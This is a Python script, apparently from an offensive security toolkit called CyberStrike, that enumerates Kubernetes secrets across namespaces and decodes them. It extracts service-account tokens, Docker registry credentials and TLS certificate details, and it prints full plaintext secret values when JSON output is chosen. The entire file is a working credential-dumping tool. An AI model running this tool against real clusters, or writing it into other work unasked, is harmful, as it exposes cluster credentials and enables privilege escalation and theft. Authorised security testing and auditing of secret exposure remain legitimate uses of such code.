#!/usr/bin/env python3
"""
k8s_secrets.py — Kubernetes Secret Extraction

Dumps and decodes Kubernetes secrets across namespaces. Supports filtering by
secret type (Opaque, TLS, dockerconfigjson, service-account-token, basic-auth).
Provides special handling for TLS certificates (subject/expiry), Docker registry
credentials, and service account tokens.

Part of CyberStrike offensive security platform.
"""

import argparse
import base64
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    from kubernetes import client, config
    from kubernetes.client.rest import ApiException
except ImportError:
    print("ERROR: kubernetes client required. Install: pip3 install kubernetes", file=sys.stderr)
    sys.exit(1)


def load_k8s_config(args):
    try:
        if args.kubeconfig:
            config.load_kube_config(config_file=args.kubeconfig)
        else:
            try:
                config.load_incluster_config()
            except config.ConfigException:
                config.load_kube_config()
    except Exception as e:
        print(f"ERROR: Cannot load Kubernetes config: {e}", file=sys.stderr)
        sys.exit(1)


class K8sSecretDumper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.v1 = None
        self.total_secrets = 0
        self.decoded_count = 0

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Kubernetes Secret Extraction")
        print("=" * 70)
        print(f"PID:        {os.getpid()}")
        print(f"Namespace:  {self.args.namespace or 'all'}")
        print(f"Type:       {self.args.type or 'all'}")
        print(f"Output:     {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:    {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            print(f"\n[{record['timestamp']}] {record['namespace']}/{record['name']} "
                  f"(type={record['secret_type']})", flush=True)
            print(f"  keys: {', '.join(record.get('keys', []))}", flush=True)
            for key, value_info in record.get("decoded", {}).items():
                if isinstance(value_info, dict):
                    display = value_info.get("redacted", value_info.get("value", ""))
                else:
                    display = str(value_info)[:20] + "..." if len(str(value_info)) > 20 else str(value_info)
                print(f"  {key}: {display}", flush=True)
            if record.get("tls_info"):
                tls = record["tls_info"]
                print(f"  TLS subject: {tls.get('subject', 'N/A')}", flush=True)
                print(f"  TLS expiry:  {tls.get('not_after', 'N/A')}", flush=True)
                print(f"  TLS issuer:  {tls.get('issuer', 'N/A')}", flush=True)
            if record.get("registry_info"):
                reg = record["registry_info"]
                print(f"  Registry: {reg.get('registry', 'N/A')}", flush=True)
                print(f"  Username: {reg.get('username', 'N/A')}", flush=True)
            if record.get("token_info"):
                tok = record["token_info"]
                print(f"  Token namespace: {tok.get('namespace', 'N/A')}", flush=True)

    def decode_value(self, raw_b64):
        """Base64-decode a secret value. Returns the decoded string."""
        try:
            decoded = base64.b64decode(raw_b64).decode("utf-8", errors="replace")
            return decoded
        except Exception:
            return "<binary data>"

    def redact(self, value):
        """Redact a value for text output: first 20 chars + ..."""
        if not value:
            return ""
        if len(value) <= 20:
            return value
        return value[:20] + "..."

    def parse_tls_cert(self, cert_pem):
        """Extract subject and expiry from a PEM certificate."""
        info = {"subject": None, "issuer": None, "not_before": None, "not_after": None}
        try:
            import ssl
            import tempfile
            with tempfile.NamedTemporaryFile(mode="w", suffix=".pem", delete=False) as f:
                f.write(cert_pem)
                f.flush()
                cert_path = f.name
            try:
                cert_dict = ssl._ssl._test_decode_cert(cert_path)
                if cert_dict:
                    subject = cert_dict.get("subject", ())
                    subject_parts = []
                    for rdn in subject:
                        for attr_type, attr_value in rdn:
                            subject_parts.append(f"{attr_type}={attr_value}")
                    info["subject"] = ", ".join(subject_parts)
                    issuer = cert_dict.get("issuer", ())
                    issuer_parts = []
                    for rdn in issuer:
                        for attr_type, attr_value in rdn:
                            issuer_parts.append(f"{attr_type}={attr_value}")
                    info["issuer"] = ", ".join(issuer_parts)
                    info["not_before"] = cert_dict.get("notBefore")
                    info["not_after"] = cert_dict.get("notAfter")
            finally:
                os.unlink(cert_path)
        except Exception:
            pass
        return info

    def parse_dockerconfigjson(self, data):
        """Extract registry and username from dockerconfigjson."""
        info = {"registry": None, "username": None}
        try:
            parsed = json.loads(data)
            auths = parsed.get("auths", {})
            for registry, creds in auths.items():
                info["registry"] = registry
                info["username"] = creds.get("username")
                break
        except (json.JSONDecodeError, AttributeError):
            pass
        return info

    def parse_sa_token(self, token):
        """Extract audience/namespace from a service account JWT token."""
        info = {"namespace": None, "service_account": None}
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += "=" * padding
                decoded = json.loads(base64.b64decode(payload))
                ns = decoded.get("kubernetes.io/serviceaccount/namespace")
                sa = decoded.get("kubernetes.io/serviceaccount/service-account.name")
                info["namespace"] = ns
                info["service_account"] = sa
        except Exception:
            pass
        return info

    def process_secret(self, secret):
        """Process a single Kubernetes secret."""
        if not self.running:
            return

        secret_type = secret.type or "Opaque"
        if self.args.type and secret_type != self.args.type:
            return

        self.total_secrets += 1
        keys = list(secret.data.keys()) if secret.data else []
        decoded = {}
        tls_info = None
        registry_info = None
        token_info = None

        if secret.data:
            for key, raw_value in secret.data.items():
                value = self.decode_value(raw_value)
                self.decoded_count += 1
                if self.args.json_output:
                    decoded[key] = {"value": value, "size": len(value)}
                else:
                    decoded[key] = {"redacted": self.redact(value), "size": len(value)}

        if secret_type == "kubernetes.io/tls" and secret.data:
            cert_data = secret.data.get("tls.crt")
            if cert_data:
                cert_pem = self.decode_value(cert_data)
                tls_info = self.parse_tls_cert(cert_pem)

        if secret_type == "kubernetes.io/dockerconfigjson" and secret.data:
            config_data = secret.data.get(".dockerconfigjson")
            if config_data:
                decoded_config = self.decode_value(config_data)
                registry_info = self.parse_dockerconfigjson(decoded_config)

        if secret_type == "kubernetes.io/service-account-token" and secret.data:
            token_data = secret.data.get("token")
            if token_data:
                decoded_token = self.decode_value(token_data)
                token_info = self.parse_sa_token(decoded_token)

        record = {
            "timestamp": datetime.now().isoformat(),
            "name": secret.metadata.name,
            "namespace": secret.metadata.namespace,
            "secret_type": secret_type,
            "keys": keys,
            "decoded": decoded,
            "tls_info": tls_info,
            "registry_info": registry_info,
            "token_info": token_info,
        }
        self.emit(record)

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        load_k8s_config(self.args)
        self.v1 = client.CoreV1Api()

        try:
            if self.args.namespace:
                result = self.v1.list_namespaced_secret(namespace=self.args.namespace)
            else:
                result = self.v1.list_secret_for_all_namespaces()
        except ApiException as e:
            print(f"ERROR: Failed to list secrets: {e.reason}", file=sys.stderr)
            return

        for secret in result.items:
            if not self.running:
                break
            self.process_secret(secret)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- k8s_secrets summary ---")
        print(f"Total secrets processed: {self.total_secrets}")
        print(f"Values decoded: {self.decoded_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract and decode Kubernetes secrets.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 k8s_secrets.py\n"
            "  python3 k8s_secrets.py --namespace default\n"
            "  python3 k8s_secrets.py --type kubernetes.io/tls\n"
            "  python3 k8s_secrets.py --json-output\n"
            "  python3 k8s_secrets.py --kubeconfig /path/to/kubeconfig\n"
        ),
    )
    parser.add_argument("--namespace", type=str, default=None, help="Filter to a specific namespace")
    parser.add_argument("--type", type=str, default=None,
                        choices=["Opaque", "kubernetes.io/tls", "kubernetes.io/dockerconfigjson",
                                 "kubernetes.io/service-account-token", "kubernetes.io/basic-auth"],
                        help="Filter by secret type")
    parser.add_argument("--kubeconfig", type=str, default=None, help="Path to kubeconfig file")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    dumper = K8sSecretDumper(args)
    dumper.run()


if __name__ == "__main__":
    main()
